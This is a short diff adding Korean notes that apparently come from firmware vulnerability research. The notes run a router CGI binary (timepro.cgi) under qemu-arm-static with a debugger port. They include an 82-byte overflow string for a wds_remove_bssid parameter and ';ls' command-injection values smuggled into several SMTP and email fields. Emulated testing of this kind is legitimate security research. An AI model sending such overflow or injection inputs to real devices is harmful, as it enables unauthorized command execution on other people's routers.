@@ -1,0 +1,8 @@
+루트폴더로 이동한 후
+
+-g : IDA 디버깅 포트
+(remote gdb, host, port)
+
+chroot . ./qemu-arm-static -g 4321 -strace -E REQUEST_METHOD="GET" -E REMOTE_ADDR="127.0.0.1" cgibin/timepro.cgi tmenu=iframe smenu=ap_list_wds ifname="wlan0" act=modify wl_mode=modify wds_remove_bssid=$(python -c 'print "B"*82')
+
+sudo chroot . ./qemu-arm-static -g 9989 -E REQUEST_METHOD="POST" -E REMOTE_ADDR="127.0.0.1" cgibin/timepro.cgi -E tmenu=iframe smenu=hiddenloginsetup act=apply_mail email=$(python -c 'print ";ls"') smtp=$(python -c 'print ";ls"') send_mail=$(python -c 'print ";ls"') smtp_auth=on account=$(python -c 'print ";ls"') smtp_pass=$(python -c 'print ";ls"')
